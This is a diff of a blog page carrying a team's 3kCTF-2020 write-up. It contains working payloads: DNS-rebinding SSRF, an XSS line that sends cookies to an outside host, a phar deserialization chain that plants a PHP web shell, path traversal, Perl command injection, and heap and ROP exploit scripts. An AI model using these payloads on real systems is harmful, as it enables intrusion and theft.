@@ -1,46 +1,40 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto">
 
-<head><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>3kCTF-2020 Writeup | Black Bauhinia</title>
 
-<meta name="keywords" content="ctf, pwnthybytes-ctf" />
-<meta name="description" content="reporter (Web; 498 points) Solved by apple.
-Author: rekter0
- Reporter is an online markdown reporting tool. it&#39;s free to use for everyone. there&#39;s a secret report we need located here
-source
- Walkthrough The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the &#39;report&#39;.
-There are 4 buttons on the interface: Edit, Preview, Save, and Deliver.
-The first target of the challenge is to access the secret_report.">
-<meta name="author" content="apple, cire meat pop, eriri, Mystiz, ozetta">
-<link rel="canonical" href="https://b6a.black/posts/2020-07-28-3kctf/" />
-<link href="/assets/css/stylesheet.min.9733bd0dca4a7fe1379bd36836878b5b67d7a574e270b0fd4860e518a432e117.css" integrity="sha256-lzO9DcpKf&#43;E3m9NoNoeLW2fXpXTicLD9SGDlGKQy4Rc=" rel="preload stylesheet"
-    as="style">
+    
 
-<link rel="icon" href="https://b6a.black/favicon.ico">
+<html lang="en-us" data-theme="dark">
+<head>
+    
+        
+<meta charset="utf-8">
+<meta name="HandheldFriendly" content="True">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer-when-downgrade">
 
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<meta name="generator" content="Hugo 0.68.3" />
+<title>3kCTF-2020 Writeup - Black Bauhinia</title>
+<meta name="description" content="">
+
+<link rel="icon" type="image/x-icon" href="https://b6a.black/favicon.ico">
+<link rel="apple-touch-icon-precomposed" href="https://b6a.black/favicon.png">
+
+
+
+    
 
 
 
 
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
 
-  gtag('config', 'G-M67YZZ2MP1');
-</script>
+    
+    
+    
+
+    
+        <link rel="stylesheet" href="https://b6a.black/css/style.09c94e06b3ec0503263ea0297febd3b62f3d6b2dafd8e813aa92a479e82bc955.css" integrity="sha256-CclOBrPsBQMmPqApf&#43;vTti89ay2v2OgTqpKkeegryVU=">
+    
 
 
-
-<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>
 
 
 
@@ -56,6 +50,7 @@ The first target of the challenge is to access the secret_report." />
 <meta property="og:url" content="https://b6a.black/posts/2020-07-28-3kctf/" />
 <meta property="article:published_time" content="2020-07-28T11:36:00+08:00" />
 <meta property="article:modified_time" content="2020-07-28T11:36:00+08:00" />
+
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="3kCTF-2020 Writeup"/>
 <meta name="twitter:description" content="reporter (Web; 498 points) Solved by apple.
@@ -66,102 +61,49 @@ source
 There are 4 buttons on the interface: Edit, Preview, Save, and Deliver.
 The first target of the challenge is to access the secret_report."/>
 
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "3kCTF-2020 Writeup",
-  "name": "3kCTF-2020 Writeup",
-  "description": "reporter (Web; 498 points) Solved by apple.\nAuthor: rekter0\n Reporter is an online markdown reporting tool. it\u0026#39;s free to use for everyone. there\u0026#39;s a secret report we need located …",
-  "keywords": [
-    "ctf", "pwnthybytes-ctf"
-  ],
-  "articleBody": "reporter (Web; 498 points) Solved by apple.\nAuthor: rekter0\n Reporter is an online markdown reporting tool. it's free to use for everyone. there's a secret report we need located here\nsource\n Walkthrough The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the 'report'.\nThere are 4 buttons on the interface: Edit, Preview, Save, and Deliver.\nThe first target of the challenge is to access the secret_report.\ncurl http://reporter.3k.ctf.to/secret_report  htmlhead title403 Forbiddentitle ... Well, knew that.\nExploiting TOCTOU of the domain checking Interesting things happen in backend.php.\nif(@$_POST['deliver']){ $thisDoc=file_get_contents($dir.'/file.html'); $images = preg_match_all(\"/img src=\\\"(.*?)\\\" /\", $thisDoc, $matches); foreach ($matches[1] as $key = $value) { $thisDoc = str_replace($value , \"data:image/png;base64,\".base64_encode(fetch_remote_file($value)) , $thisDoc ) ; } When user click on the deliver button it will get the saved document, fetch_remote_file and embed it to the report with base64. Therefore users can embed images from external image hosting sites such as imgur etc.\nHow about embedding the secret_report? It does not work as it do a long list of checks:\nfunction fetch_remote_file($url) { $config['disallowed_remote_hosts'] = array('localhost'); $config['disallowed_remote_addresses'] = array(\"0.0.0.0/8\", \"10.0.0.0/8\", \"100.64.0.0/10\", \"127.0.0.0/8\", \"169.254.0.0/16\", \"172.16.0.0/12\", \"192.0.0.0/29\", \"192.0.2.0/24\", \"192.88.99.0/24\", \"192.168.0.0/16\", \"198.18.0.0/15\", \"198.51.100.0/24\", \"203.0.113.0/24\", \"224.0.0.0/4\", \"240.0.0.0/4\",); // ... $addresses = get_ip_by_hostname($url_components['host']); $destination_address = $addresses[0]; // ... checks if the destination_address is in the disallowed list ... $opts = array('http' = array('follow_location' = 0,)); $context = stream_context_create($opts); return file_get_contents($url, false, $context); } function get_ip_by_hostname($hostname) { $addresses = @gethostbynamel($hostname); if (!$addresses) { // ... more attempts to get dns A records ... } return $addresses; } If we change the DNS record very quickly, which the DNS server return 1.1.1.1 at get_ip_by_hostname when it do the checking, and we return 127.0.0.1 at file_get_contents we can access the localhost and maybe we can get the secret_report.\nTherefore I wrote a script1 to act as a nameserver and give different responses.\n$ dig +short 4kctf.example.com @8.8.8.8 1.1.1.1 $ dig +short 4kctf.example.com @8.8.8.8 127.0.0.1 payload\n![](http://4kctf.example.com/secret_report/) The result is a file listing with two files:\n3ac45ca05705d39ed27d7baa8b70ecd560b69902.php secret2 63b4bacc828939706ea2a84822a4505efa73ee3e.php not much here The 3ac45ca05705d39ed27d7baa8b70ecd560b69902.php is suspicious as it have 50 bytes but only 7 bytes returned from server. Maybe the flag is there.\nWonders of PHP: empty(\"0\") == true I crafted this payload to read the file and get the flag.\n![](0:/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php) Back to the backend.php fetch_remote_file, besides DNS checking it also parse_url and checks scheme, port, etc.\nfunction fetch_remote_file($url) { // ... $url_components = @parse_url($url); if (!isset($url_components['scheme'])) { return false; } if (@($url_components['port'])) { return false; } if (!$url_components) { return false; } if ((!empty($url_components['scheme']) \u0026\u0026 !in_array($url_components['scheme'], array('http', 'https')))) { return false; } if (array_key_exists(\"user\", $url_components) || array_key_exists(\"pass\", $url_components)) { return false; } // ... return file_get_contents($url, false, $context); parse_url will parse as follows\narray(2) { [\"scheme\"]= string(1) \"0\" [\"path\"]= string(62) \"/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php\" } Where the scheme will return true for isset and true for empty (empty(\"0\") == true), and for file_get_contents it will recognize 0: as a folder and 0:/../ as current folder.\nxsser (Web; 499 points) Solved by ozetta.\nDescription  challenge\nAuthor: Dali\n Walkthrough Source code is provided:\n include('flag.php'); class User { public $name; public $isAdmin; public function __construct($nam) { $this-name = $nam; $this-isAdmin=False; } } ob_start(); if(!(isset($_GET['login']))){ $use=new User('guest'); $log=serialize($use); header(\"Location: ?login=$log\"); exit(); } $new_name=$_GET['new']; if (isset($new_name)){ if(stripos($new_name, 'script'))//no xss :p  { $new_name = htmlentities($new_name); } $new_name = substr($new_name, 0, 32); echo 'Error! Your msg '.$new_name.'\n'; echo 'Contact admin /req.php '; } if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){ setcookie(\"session\", $flag, time() + 3600); } $check=unserialize(substr($_GET['login'],0,56)); if ($check-isAdmin){ echo 'welcome back admin '; } ob_end_clean(); show_source(__FILE__);  From the challenge name it is about XSS. After setting $_GET['login'], you can enter something in $_GET['new'], which is supposed to be reflected on the page for XSS.\nThanks to ob_start(); and ob_end_clean();, nothing about the user input are printed in the normal case.\nTo address this, we can make the interpreter panic before ob_end_clean();. Maybe unserialize could do so?\nBut most of the time unserialize just returns FALSE when you input some garbage that is \"un-unserialize-able\" (pun intended)\nLet's try to unserialize some meaningful junks:\n foreach (get_declared_classes() as $c) { unserialize('O:'.strlen($c).':\"'.$c.'\":0:{}'); }  It shows Fatal error: Uncaught Error: Invalid serialization data for DateTime object. So DateTime should do the trick.\nHow about the actual XSS payload? We can't use .\nFor some reason script could bypass that stripos but it is too long.\nLater on I found that /req.php accepts external URLs as well. So we can use some other tricks like window.name:\nname='location=\"//blah/\"+document.cookie';location='//127.0.0.1/?new=%3Cbody%20onload=eval(name)%3E\u0026login=O:8:%22DateTime%22:0:%7B%7D'; Remarks At first I tried the payload with iframe but Chrome blocks the Set-Cookie header due to \"third-party cookies preference\".\nThen I tried the payload with form and Chrome blocks the popup as expected. But for some reason the Headless Chrome works.\nimage uploader (Web; 498 points) Solved by ozetta.\nDescription  challenge\nsource\nAuthor: Dali\n 題解 (Walkthrough) 我知你睇唔明廣東話架啦. 今次有翻譯.\n I know you don't understand Cantonese. This time got translation.\n 個 description 得兩條奸笑5678. 是但啦有醬油有計傾.\n (Some unimportant gibberish)\n 一開 index.php 就見到 include('old.php');//todo remove this useless file :\\\n After opening index.php then we can see that include stuff...\n 明眼人一睇就知係伏啦. 一睇兩個 Class 重唔係玩 unserialize.\n Obviously it is the vulnerable point. It contains 2 classes so obviously it is about unserialize.\n 碌落 D (唔好譯啦你譯唔到個 D 架啦) 個 index.php 見到 file_get_contents. 條件反射 phar unserialize\n Scroll down [Don't translate that \"D\", you can't] that index.php, we can see file_get_contents. It immediately links to phar unserialize\n 有個 upload.php 真係可以 upload 野. 不過會 check getimagesize 同 image/jpeg\n There is an upload.php that can really upload things. But it checks with getimagesize and image/jpeg.\n 睇返個 old.php, 又係驗眼嘅時間. 最底有個 $data = \"\\n\" . $data; 但係無咩用.\n Let's go back to old.php and check our eyesight. The bottom $data = \" looks interesting but unless.\n 除非個 sprintf('%012d', $expire) 可以整走個 exit() 啦.\n Unless sprintf('%012d', $expire) could be used to get rid of that exit().\n 再碌上 D 見到個詭異嘅 variable function return $serialize($data);. 咁開心.\n Scroll up a bit then we can see a weird variable function return $serialize($data);. So exciting.\n 所以如果將 $this-options['serialize'] 改做 system 就可以行 system.\n So if we set $this-options['serialize'] to system then we could run system.\n 但係個 $data 要點砌呢. 根據所謂 POP 可以 trace 到:\n But how can we control $data? According to the so-called Property-Oriented Programming, you can trace like this:\n $this-options['serialize']($data) //cl2-serialize\n= $this-serialize($value) //cl2-set\n= $this-store-set($this-key, $this-getForStorage(), $this-expire); //cl1-save\n= return json_encode([$this-cleanContents($this-cache), $this-complete]); //cl1-getForStorage()\n首先個 $data 有少少限制. 因為係 json_encode 個 Array.\n First, the $data is a bit restricted. Because it is constructed by json_encode-ing an array.\n 不過你想用 system 行 command 其實可以好求其. 好似咩 $(ls).\n But if you just need to use system to execute command, it is pretty flexible. Like using $(ls).\n 最後可以砌到好似 system('[\"$(ls)\",0]').\n At the end of the day we should be able to construct like system('[\"$(ls)\",0]').\n 要 trigger cl1-save, destructor 個 $this-autosave 要 false.\n If you want to trigger cl1-save, in the destructor, $this-autosave should be false.\n 依家有齊啲餡啦. 要搵返 phar 個 payload.\n We are cooking with gas. Now we need to get the phar payload.\n 邊鬼個會記得點寫. 抄返自己個威噏.\n Who the heck will remember how to write the payload. Just copy my own write-up.\n https://github.com/ozetta/ctf-challenges/wiki/Envy-(Tangerine)\n由 $p = new Phar('malware.phar'); 果行抄起 (好似係)\n Copy the payload starting from $p = new Phar('malware.phar');\n 上面記得抄返個 Class definition 同埋改晒 D property 佢.\n Remember to copy the class definitions and change the properties to the desired one.\n 個 getimagesize 同 image/jpeg 點算? 求其攝個 jpg 向頭咪得囉.\n How to tackle getimagesize and image/jpeg? Just inject a jpg file in front.\n  Final payload key = $key; $this-store = $store; $this-expire = $expire; //add your own properties $this-cache = ['$(echo PD89YCRfR0VUWzBdYDs= | base64 -d  /var/www/html/up/z.php)']; $this-autosave = 0; $this-complete = 0; } } class cl2 { public function __construct(){ //add your own properties $this-options['serialize'] = \"system\"; $this-writeTimes = 0; $this-options['prefix'] = ''; $this-options['data_compress'] = 0; } } $x = new cl1(new cl2(),\"z\",0); $p = new Phar('malware.phar'); $p-startBuffering(); $p-addFromString(\"z\",\"\"); $j = file_get_contents(\"1.jpg\"); $p-setStub($j.\"\"); $p-setMetadata($x); $p-stopBuffering(); $file = file('malware.phar');  之後 upload 個「圖」, 出返個 \"filename.jpg\". 之後讀 php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename.\n Then upload that \"image\", will return \"filename.jpg\". Then access php://filter/convert.base64-encode/resource=phar:///var/www/html/up/filename.\n 之後點玩自己諗啦. 提示: 估下 PD89YCRfR0VUWzBdYDs= 係咩先.\n The rest is left as an exercise for the readers. (Hint: decode PD89YCRfR0VUWzBdYDs=)\n Remark \n呢題咁易都搞咗我個半鐘真係失敗。\n\nhttps://twitter.com/confus3r/status/1286850105513930752\n慘。早啲起身咪有 First Blood (好似係\ncarthagods (Web; 496 points) Author: rekter0, Dali\n Salute the carthagods!\nHints\n redacted source   Exploit The challenge provided the redacted sourcecode as hints.\n.htaccess\n... RewriteRule ^([a-zA-Z0-9_-]+)$ index.php?*REDACTED*=$1 [QSA] index.php\n...  if(@$_GET[*REDACTED*]){ $file=$_GET[*REDACTED*]; $f=file_get_contents('thecarthagods/'.$file); if (!preg_match(\"/, $f)){ echo $f; }else{ echo 'php content detected'; } } ? ...  The php script accepts user provided $file path without any sanitation, however the GET parameter is redacted.\nThe .htaccess file rewrite the path to index.php with the GET parameter. Lets try the folder thecarthagods as shown in the php file.\ncurl http://carthagods.3k.ctf.to:8039/thecarthagods We got the token\n htmlhead title301 Moved Permanentlytitle headbody h1Moved Permanentlyh1 pThe document has moved a href=\"http://carthagods.3k.ctf.to:8039/thecarthagods/?eba1b61134bf5818771b8c3203a16dc9=thecarthagods\"herea.p hr addressApache/2.4.29 (Ubuntu) Server at carthagods.3k.ctf.to Port 8039address bodyhtml With the token we can do path traversal\ncurl \"http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd\"root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ... However we cannot print the content of flag.php directly\ncurl \"http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../flag.php\"php content detected  From the phpinfo provided we can know opcache is enabled, with opcache.file_cache set to /var/www/cache/. Maybe we can get the compiled version of flag.php and get its content.\nThe opcache will store the cache in the format /var/www/cache//path/to/file.php.bin, with system ID generated from PHP version, Zend version etc. Therefore, I spin up a Ubuntu VM and install the same version of php, enable opcache to get the same system ID.\nThe system ID is: e2c6579e4df1d9e77e36d2f4ff8c92b3\ncurl \"http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin\" --output -... textarea class=\"label-input100\" style=\"color:black;width: 100%;height: 300px;\"OPCACHEe2c6579e4df1d9e77e36d2f4ff8c92b3�x��_Jqҍ@������������������������_���Ӛ��_/var/www/html/flag.php������/var/www/html/flag.php1����q��������d!= VPyi0���Y�Į��{�opcache_get_statush���JK��\u00263k{Hail_the3000_years_7hat_are_b3h1nd}`Lq�(��iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/y8zZXMLBin4\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreeniframe֖|�flag textarea ... linker (Pwn; 493 points) Solved by cire meat pop.\nProgram root@kali:~/3kctf/linker# ./linker Welcome to your secret journal! Provide name size: 8 Provide a name: abcd Welcome abcd ! What would you like to do? 1- Get new blank page 2- Edit page content 3- Empty a page 4- Relogin 5- Exit   This seems to be a heap challenge, which allow user to create, edit and free a chunk. Also, it provides a weird function (i.e., relogin) for changing the name which does nothing to the other functions, and usually means it will be used for later exploit.\nVulnerability In 3- Empty a page:\nputs(\"Provide page index:\"); read(0, \u0026buf, 4uLL); idx = atoi(\u0026buf); if ( idx  0 || idx  4 ) { puts(\"Wrong index kiddo...\"); } else if ( check_pages[idx] ) { free(pages[idx]); check_pages[idx] = 0; // vuln  --number_pages; } After freed a chunk, only the check[idx] is set to 0; and in Edit page content:\nputs(\"Provide page index:\"); read(0, \u0026buf, 4uLL); idx = atoi(\u0026buf); if ( idx  0 || idx  4 ) { puts(\"Wrong index kiddo...\"); } else if ( pages[idx] ) // not checked { puts(\"Provide new page content:\"); read(0, pages[idx], (int)page_size[idx]); } Edit function won't check check[idx], which means we can overwrite a free chunk.\nExploit As we can overwrite any data into the free chunk, we can perform some attack to overwrite __malloc_hook or __free_hook with one gadget rce.\nHowever, we had two problems.\n tcache techniques won't work with calloc  Solution: We filled up tcache and perform fastbin attack.  Theres are no show functions to leak libc addresses  Solution: We utilize unsorted bin attack to write unsorted bin address to name, then relogin to print the content of name.   Problem can't access tty; job control turned off\nWill this means we can't open the shell? Whatever, we change the approach from utilizing one gadget RCE to calling the system function. We can overwrite __free_hook with system, then free a chunk with content /bin/cat flag, yielding system(\"/bin/cat flag\"). However, if we want control __free_hook, we need to try harder. Finally, we perform fastbin attack to control pages and check_pages, edit the pointer of each page to an arbitrary address, and eventually we have arbitrary address write.\n3k{unlink_the_world_and_feel_the_void}\none and a half man (Pwn; 493 points) Solved by cire meat pop.\nProgram ssize_t vuln() { char buf; // [rsp+6h] [rbp-Ah]  return read(0, \u0026buf, 0xAAuLL); } This is a short function that obviously vulnerable to buffer overflow. I have solved similar challenge before, and my approach was to overwrite first 2 byte the read_got to run one gadget RCE. It involves 4 bit randomness to satisfy, hence I have a 1/16 chance to solving it. It works, but can't access tty; job control turned off. Okay, I shouldn't forgot shell interaction is disabled from this server.\nExploit I find a syscall near the one gadget RCE so that we can jump to syscalls. It's time to construct ROP:\nmov eax, 0 ; pop rbp ; ret g1(in binary) mov edx, eax ; mov eax, edx ; ret (in libc) pop rdi; ret (in binary) pop rsi; pop r15; ret (in binary) move eax, 0x3b; syscall (in libc) By this ROP chain we can set edx (the third argument) to 0, control rdi and rsi (the first and the second arguments) and call sys_execve.\nsys_execve(*filename, argv[], envp[]) To cat flag:\nsys_execve('/bin/cat', ['/bin/cat', 'flag'], 0) Finally our script:\npayload = \"a\"*18 + flat(pop_rsi_r15, buf, 0, read_plt, vuln) p.send(payload) sleep(0.5) string = \"/bin/cat\".ljust(0x10,\"\\x00\")+p64(buf)+p64(buf+0x28) \\ +p64(0)+\"flag\"+\"\\x00\"*4 p.send(string) sleep(0.5) payload2 = flat(pop_rsi_r15, setvbuf_got, 0, read_plt, pop_rsi_r15, read_got, \\ 0, read_plt, g1, buf, setvbuf_plt, pop_rdi, buf, pop_rsi_r15, \\ buf+0x10, 0, read_plt) ret p.send(\"a\"*18 + payload2) sleep(0.5) p.send(\"\\x5b\\xd6\") # (in libc) mov edx, eax ; mov eax, edx ; ret sleep(0.5) p.send(\"\\x72\\x04\") # (in libc) move eax, 0x3b; syscall sleep(0.5) p.interactive() 3k{one_byte_and_a_half_overwrite_ftw!}\nmicroscopic (Reverse; 488 points) Solved by Mystiz.\nOpen with IDA pro. There is a curious function defined on sub_F7C:\nunsigned __int64 __fastcall sub_F7C(unsigned int a1) { case 3: // ...  // v3 hereby is the length of the length of the target ciphertext  ciphertext[v2] = (v3 ^ input[v12]) + v2; // ...  break; case 4: // ...  v9 = ciphertext[v12] != target_ciphertext[v12]; // ...  break; }  Hereby target_ciphertext is is an array of 39 integers, located on 0x202020. We can simply write a Python script that extract target_ciphertext and compute the corresponding input.\nelf = ELF('challenge/micro') target = elf.read(0x202020, 39*4) target = [unpack('I', target[4*i:4*i+4])[0] for i in range(39)] target = [(c-i)^39 for i, c in enumerate(target)] print(bytes(target)) # 3k{nan0mites_everywhere_everytime_ftw!} game (Reverse/Misc; 486+477 points) Solved by eriri.\ngame 1 find your way to the heart of the maze game 2 the shortest route is often the best You are given an Unity game folder at the beginning. When you start the game, you are in a dark maze. You can walk but not jump nor run. Nothing will be triggered when you walk out of the maze.\nI think there should be multiple ways to solve the challenge. One solution will be physcially break the maze. How to do that? By deleting the walls object in the level.\nWith Unity Assets Bundle Extractor, we are able to delete walls in /CTF_Data/level0 (which is level of the maze). \nAfter deleting some of the wall objects (for me I selected the GameObject Wall with number greater than 100) and returning to the game, you will find a wall that marks the flag for game 2:\n\nThere are some characters missing in the wall because we deleted some of the characters by accident. We did a bit of guess and finally got the flag: 3K-CTF-A-MAZE-ING.\nThere are also some floating walls inside the maze. When you walk through it you will get a word overlayed on the top left corner. \nDecompiling /CTF_Data/Managed/Assembly-CSharp.dll will get you the logic of the game.  If you find and hit the 6 walls with the right order (I guess it should be the shortest path from the starting point to the flag room), the game will output you a flag. If not, an error message will be displayed. \nHere in UABE we found 6 assets with duplicated names. It should correspond to the 6 floating walls in the game. \nAfter some tries (with a bit of luck), we were able to get the flag for game 1. \nFlag: 3K-CTF-GamingIsNotACrime.\nReference: https://github.com/imadr/Unity-game-hacking\npyzzle (Reverse/Misc/Crypto; 459+479 points) Solved by crabmony and Mystiz.\nPart 1 We are given a concrete syntax tree that is from LibCST.\nWe referred to the documentation and traverse the tree manually. Eventually we have manually parsed the tree into a Python script:\nimport binascii plaintext = 'REDACTED' def exor(a, b): temp = \"\" for i in range(n): if a[i] == b[i]: temp = 0 else: temp = 1 return temp def BinaryToDecimal(binary): string = int(binary, 2) return string PT_Ascii = [ord(x) for x in plaintext] PT_Bin = [format(y, '08b') for y in PT_Ascii] PT_Bin = \"\".join(PT_Bin) n = 26936 K1 = '...' # Redacted as this binary string is too long. K2 = '...' # Ditto L1 = PT_Bin[:n] R1 = PT_Bin[n:] f1 = exor(R1,K1) R2 = exor(f1, L1) L2 = R1 f2 = exor(R2, K2) R3 = exor(f2, L2) L3 = R2 R3 = '...' # Ditto L3 = '...' # Ditto cipher = L3 + R3 plaintext = L6 + R6 plaintext = int(plaintext, 2) plaintext = binascii.unhexlify('%x' % plaintext) print(plaintext) Since we are given everything (except the plaintext), we are able to recover the plaintext by reversing the operations. We ended up with a STP file that contains the flag: 3k{almost_done_shizzle_up_my_nizzle}.\nPart 2 From the STP file, apart from the flag, we have a bunch of nodes and edges. This part we are connecting the dots with Python:\ndef parse_line(line): return list(map(int, line.split(' ')[1:])) def main(): with open('pyzzle2') as f: lines = f.read().strip().split('\\n') edges = list(map(parse_line, lines[8:124])) points = list(map(parse_line, lines[127:271])) point_map = {} for id, x, y in points: point_map[id] = (x, y) im = Image.new('1', (1850, 110), color=1) draw = ImageDraw.Draw(im) for id1, id2, _ in edges: x1, y1 = point_map.get(id1) x2, y2 = point_map.get(id2) draw.line((x1, y1, x2, y2), fill=0) im.save('flag.png') main() \nFlag: 3K-PYZZLE_FO_SHIZZLE_MY_NIZZLE.\nA hundred friends (Crypto; 496 points) Solved by Mystiz.\nkey = RSA.generate(1024) pad = random.randint(1, 2**UPPER_BOUND) exp = random.randint(1, 3) c = pow(m**exp + pad, 3, key.n) This is a challenge similar to Multicast in PlaidCTF 2017. Theoretically, we should be able to recover the original message with 3 ciphertexts, assuming that those ciphertexts are encrypted with exp = 1.\nWe have written the core logic to retrieve the message, given some ciphertexts:\ndef attempt(subpairs): n = len(subpairs) # (m + pi)^3 = ci (mod ni) cs = list(map(lambda pair: pair[0], subpairs)) ns = list(map(lambda pair: pair[1], subpairs)) ps = list(map(lambda pair: pair[2], subpairs)) nprod = reduce(mul, ns) gs = [[0 for _ in range(n)] for _ in range(3+1)] for i in range(n): for j in range(3+1): gs[j][i] = binomial(3, j) * pow(ps[i], j, nprod) % ns[i] gs[3][i] = ((gs[3][i] - cs[i]) % ns[i] + ns[i]) % ns[i] gg = [int(crt(gs[i], ns)) for i in range(3+1)] # Defines e, Zn = Zmod(nprod) and the parameters for the # Coppersmith's attack here. Omitted roots = coppersmith_howgrave_univariate(pol, nprod, beta, mm, tt, XX) if len(roots)  0: return roots[0] (Some functions are copied from mimoo/RSA-and-LLL-attacks. They are not included here for simplicity)\nHowever, we are unable to recover the message from sampling three ciphertexts in 100 rounds (it should happen in around 27 rounds). The reason is the message isn't small enough for Coppersmith's attack. Hence, we are sampling more ciphertexts (from 3 to 5) and the attack worked:\nn = 5 attempt_count = 0 while True: random.shuffle(pairs) subpairs = pairs[:n] attempt_count += 1 if attempt_count % 100 == 0: print(f'Attempt {attempt_count}') m = attempt(subpairs) if m is None: continue m = int(m) flag = m.to_bytes(length=(m.bit_length() + 7)//8, byteorder='big') print(subpairs) print(flag) break # b'3k{H4st4d_St1ll_Rul3S}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' Note that there is a chance to return m^2 or m^3. As I am lazy, I just run the script again until it returns m.\nRSA textbook (Crypto; 496 points) Solved by Mystiz.\nThis challenge is similar to De1CTF's easyRSA. By reading the same reference paper [Howgrave-Graham 1999], we have the matrix in session 3.3. By using the matrix directly and perform LLL, we can recover d1 (the private key that corresponds to e1). We can then recover phi(n) and thus compute d (that corresponds to e), hence decrypting the ciphertext: 3k{hOwGr4v3_gr4h4m_and_s31F3rt_4re_C00l}AAAAAAAAAAAAAAAAAAAA.\nYou shall not get my cookies (Crypto; 495 points) Solved by Mystiz.\nThis is a standard padding oracle attack.\ndef connect(): HOST = 'youshallnotgetmycookies.3k.ctf.to' PORT = 13337 global debug if debug: context.log_level = 'debug' else: context.log_level = 'error' r = remote(HOST, PORT) return r def oracle(ciphertext): r = connect() payload = binascii.hexlify(ciphertext) r.sendlineafter(b'~ So... whats your cookie:', payload) r.recvuntil(b'~ ') res = r.recvline().strip() r.close() return res != b'That cookie looks burned!' def main(): ciphertext = binascii.unhexlify('90C560B2A01529EF986E54B016E1FEAAD79A54BE52B373311E3B4F8251BE269EC199AE6B370BFCE50A54EEC25ABB0F22') po = PaddingOracle(oracle, threads=16) plaintext = po.recover(ciphertext) print(plaintext) # b' chocolate chip cookie\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n' ciphertext = po.forge(b'Maple Oatmeal Biscuits' + b'\\x0a' * 10) r = connect() r.sendlineafter(b'~ So... whats your cookie:', binascii.hexlify(ciphertext)) r.interactive() # ~ YES, that is exactly what i wanted! # ~ Take it! 3k{Y3t_An0th3r_Padd1ng_Oracle} main() once upon a time (Crypto; 492 points) Solved by Mystiz.\nWith a bit of code review, it is running a block cipher with block size = 1 (Source: the encrypt_file method in /src/cipher.c). The key is also redacted from the source (Source: /src/main.c). Moreover, surprisingly, the key is not redacted from the binary.\n*(_QWORD *)v45 = '\\x01\\0\\0\\0\\x01\\x01\\x01\\0'; *(_QWORD *)\u0026v45[8] = '\\x01\\0\\x01\\0\\0\\x01\\x01\\0'; *(_QWORD *)\u0026v45[16] = '\\x01\\0\\x01\\0\\x01\\0\\0'; *(_QWORD *)\u0026v45[24] = '\\x01\\x01\\x01\\x01\\x01\\0\\0\\x01'; *(_QWORD *)\u0026v45[32] = '\\x01\\0\\0\\0\\0\\0\\x01\\x01'; But if you think I am going to reverse the algorithm, you are wrong. I'm just using the binary as an encryption oracle.\ndef encrypt(plaintext, mode): context.log_level = 'error' with open('plaintext', 'wb') as f: f.write(plaintext) r = process(['challenge/scss', 'plaintext', 'ciphertext', 'encrypt', mode]) r.wait_for_close() r.close() with open('ciphertext', 'rb') as f: ciphertext = f.read() return ciphertext def recover(target_ciphertext, mode): message = b'' for i in range(len(target_ciphertext)): for j in range(256): plaintext = message + bytes([j]) ciphertext = encrypt(plaintext, mode) if target_ciphertext.startswith(ciphertext): message = plaintext print(i, message) break return message def main(): with open('challenge/flag_encrypted', 'rb') as f: target_ciphertext = f.read() # print(recover(target_ciphertext, 'ecb')) # print(recover(target_ciphertext, 'cbc')) # print(recover(target_ciphertext, 'cfb')) print(recover(target_ciphertext, 'ofb')) # b'3k{my_hands_are_registered_as_lethal_weapons_that_means_we_get_into_a_fight_i_accidentally_kill_you_i_go_to_jail}' flood (Misc; 495 points) Solved by Mystiz.\nWe have a service running remotely. The source code, service.pl, is given to us. Perl sadness2 strikes back...\nObviously, we can actually earn more gold by selling gold. From the source code:\nprint \"? how much gold u wanna spend\\n\"; print \"! 1 GOLD = 1000 POINTS\\n \"; my $subm = ; chomp $subm; if( ($subm)  $gold and int($subm)=0){ $gold -= ($subm); $points += ($subm)*1000; } Why? We can set $subm = -0.9999... In this case we can generate as much gold as we want.\nAnother vulnerability comes from theh following line that runs during load game. This API opens if you are rich enough -- well, we are.\n# $name is what we can control. However, `.`, `/` and ` ` are forbidden. open (SAVEGAME, \"/app/files/\".$name) or break; How? For example, if $name = \"||ls|\"; it executes ls from shell. But what if we want to execute ls / given that and / are forbidden? In short, we can use \\t () in place of the (), and $(expr\\tsubstr\\t$PWD\\t1\\t1) in place of /.\nHence, we can send use ||ls\\t\"$(expr\\tsubstr\\t$PWD\\t1\\t1)\"\\t-al| as our name and the directory can be listed. The following line is curious...\n-rw-r--r-- 1 root root 30 Jul 23 14:26 fcad0373020fa6ede979389f558b396f4cd38ec1_README' We can use cat /fcad0373020fa6ede979389f558b396f4cd38ec1_README (with the above substitution) as our name. Finally the flag is there: 3k{p333rl_aInt_7hat_deAd_Y3t}.\nlibcDB (Misc; 494 points) We are given a libc database search (which looks useful and we should definitely 